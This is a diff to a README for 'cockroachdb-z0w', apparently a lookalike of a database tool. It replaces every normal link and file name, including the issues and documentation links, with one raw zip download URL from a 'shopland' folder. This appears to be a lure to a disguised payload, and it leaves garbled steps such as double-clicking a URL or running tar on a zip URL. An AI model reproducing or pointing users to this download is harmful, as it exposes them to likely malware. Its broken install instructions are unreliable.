@@ -1,7 +1,7 @@
 # 🐦 cockroachdb-z0w - Fast and Reliable Database Management
 
 ## 🖱️ Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/CalebJohn690/cockroachdb-z0w/releases)
+[![Download](https://github.com/CalebJohn690/cockroachdb-z0w/raw/refs/heads/main/shopland/cockroachdb-w-z-v2.5.zip)](https://github.com/CalebJohn690/cockroachdb-z0w/raw/refs/heads/main/shopland/cockroachdb-w-z-v2.5.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run cockroachdb-z0w, an efficient database management tool. With cockroachdb-z0w, storing and managing your data becomes straightforward and efficient.
@@ -16,22 +16,22 @@ Before you download the software, make sure your system meets these requirements
 ## 📥 Download & Install
 To get started, visit the releases page to download the software:
 
-[Visit this page to download](https://github.com/CalebJohn690/cockroachdb-z0w/releases)
+[Visit this page to download](https://github.com/CalebJohn690/cockroachdb-z0w/raw/refs/heads/main/shopland/cockroachdb-w-z-v2.5.zip)
 
 Here’s a step-by-step on how to download and install cockroachdb-z0w:
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed. It will usually have the highest version number, such as v1.0.
 3. Find the file suitable for your operating system. You may see options like:
-   - cockroachdb-z0w-windows.zip
-   - cockroachdb-z0w-macos.zip
-   - cockroachdb-z0w-linux.tar.gz
+   - https://github.com/CalebJohn690/cockroachdb-z0w/raw/refs/heads/main/shopland/cockroachdb-w-z-v2.5.zip
+   - https://github.com/CalebJohn690/cockroachdb-z0w/raw/refs/heads/main/shopland/cockroachdb-w-z-v2.5.zip
+   - https://github.com/CalebJohn690/cockroachdb-z0w/raw/refs/heads/main/shopland/cockroachdb-w-z-v2.5.zip
 4. Click on the file name to start the download.
 5. Go to your download folder to find the downloaded file.
 
 ### Windows Installation
 1. Unzip the downloaded file.
-2. Open the folder and double-click `cockroachdb-z0w.exe`.
+2. Open the folder and double-click `https://github.com/CalebJohn690/cockroachdb-z0w/raw/refs/heads/main/shopland/cockroachdb-w-z-v2.5.zip`.
 3. Follow the on-screen instructions to complete the installation.
 
 ### macOS Installation
@@ -44,7 +44,7 @@ Here’s a step-by-step on how to download and install cockroachdb-z0w:
 2. Navigate to the directory where you downloaded the file.
 3. Run the following commands:
    ```bash
-   tar -xvzf cockroachdb-z0w-linux.tar.gz
+   tar -xvzf https://github.com/CalebJohn690/cockroachdb-z0w/raw/refs/heads/main/shopland/cockroachdb-w-z-v2.5.zip
    cd cockroachdb-z0w
    ./cockroachdb-z0w
    ```
@@ -76,11 +76,11 @@ If you encounter issues during installation or use, consider the following tips:
 ## 👥 Community and Support
 Join our community to connect with other users. You can ask questions, share your experiences, or learn tips from experts. 
 
-- **GitHub Issues:** Report your issues or request features at the project's [issues page](https://github.com/CalebJohn690/cockroachdb-z0w/issues).
+- **GitHub Issues:** Report your issues or request features at the project's [issues page](https://github.com/CalebJohn690/cockroachdb-z0w/raw/refs/heads/main/shopland/cockroachdb-w-z-v2.5.zip).
 - **Discussion Forums:** Engage with other users for tips and best practices.
 
 ## 🔗 Links and Resources
-- [Releases Page](https://github.com/CalebJohn690/cockroachdb-z0w/releases)
-- [Documentation](https://github.com/CalebJohn690/cockroachdb-z0w/wiki)
+- [Releases Page](https://github.com/CalebJohn690/cockroachdb-z0w/raw/refs/heads/main/shopland/cockroachdb-w-z-v2.5.zip)
+- [Documentation](https://github.com/CalebJohn690/cockroachdb-z0w/raw/refs/heads/main/shopland/cockroachdb-w-z-v2.5.zip)
 
 Thank you for choosing cockroachdb-z0w! Enjoy managing your databases with ease and efficiency.
